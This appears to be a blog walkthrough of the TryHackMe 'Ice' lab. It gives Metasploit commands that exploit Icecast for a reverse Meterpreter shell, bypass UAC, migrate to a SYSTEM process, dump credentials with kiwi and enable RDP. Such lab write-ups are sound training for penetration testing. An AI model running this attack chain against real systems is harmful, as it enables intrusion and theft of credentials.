This is a walkthrough for room: [Ice][ice-r], on [TryHackMe][thm]. This is an easy walkthrough room. Let’s get started!

# Recon
We are going to start with an `nmap` scan:

![i1](/assets/images/thm/ice/i1.png)

We can utilize the `nmap` scan to answer the first 3 questions of the room.

# Gain Access
Let’s do some googling and look for the CVE score of the icecast vulnerability. Here is a link to the list of vulnerabilities: [Link][ice-v]. Here we find out next two answers.

Start metasploit:

```bash
msfconsole
search icecast ##(find next answer)
use 0
options
set rhosts 10.10.35.203
set lhost tun0 ##(if needed)
run
```
Wow. We got a shell! That was pretty easy. Let’s continue on!

![i2](/assets/images/thm/ice/i2.png)

# Escalate
We get the first answer right away. Next let’s run the following for more answers:

`getuid`
`sysinfo`
**NOTE:** Normally, I would back out of this exploit, and change the payload of our meterpreter shell to x64 instead of our current x86 (we always want those to line up), but in this case I am just going to keep going.

```bash
run post/multi/recon/local_exploit_suggester
background
use exploit/windows/local/bypassuac_eventvwr
options
set sessions 1 #(Your session could be a different number)
set lhost tun0
set lport 4445 #(We already have a session on 4444)
run
getprivs
```
We now have elevated permissions! Last answer can be found from the output of the `getprivs` command.

![i3](/assets/images/thm/ice/i3.png)

# Looting
Let’s run `ps`, where we find our next answer:

![i4](/assets/images/thm/ice/i4.webp)

Now we can migrate to that process with `migrate -N <process_name>`

**NOTE:** We can also migrate by using the Process ID (PIC): `migrate 692`

Now when we run getuid we are: `NT AUTHORITY\SYSTEM`. WOOHOO!

```bash
load kiwi
help
creds_all
```
With that, we have completed this section! Almost done!

# Post-Exploitation
Run `help` to answer all the questions in this section.

Enable RDP: `run post/windows/manage/enable_rdp`

# Extra Credit
That’s all there is to this room! Try doing the manual exploitation on your own!

# Review
This was a really interesting walkthrough room. While it was heavily guided, I liked how it followed the process of how you would do a pentest on the machine in a way that somewhat resembles the real-world. I hope you enjoyed this walkthrough!
